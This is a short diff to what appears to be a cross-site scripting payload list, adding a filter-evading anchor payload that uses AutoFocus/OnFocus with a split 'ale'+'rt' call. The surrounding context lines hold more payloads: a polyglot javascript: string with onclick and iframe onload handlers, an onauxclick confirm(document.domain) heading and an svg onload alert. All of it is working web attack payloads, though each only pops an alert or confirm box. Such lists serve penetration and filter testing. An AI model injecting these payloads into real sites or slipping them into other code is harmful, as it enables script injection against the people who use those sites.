@@ -48,6 +48,8 @@ ${alert}
 ────────────────────────────────────────────
 jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciframe/<iframe/oNloAd=alert()//>\x3e
 ────────────────────────────────────────────
+1'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
+────────────────────────────────────────────
 <h1 onauxclick=confirm(document.domain)>RIGHT CLICK HERE
 ────────────────────────────────────────────
 <svg/onload=alert(9)>
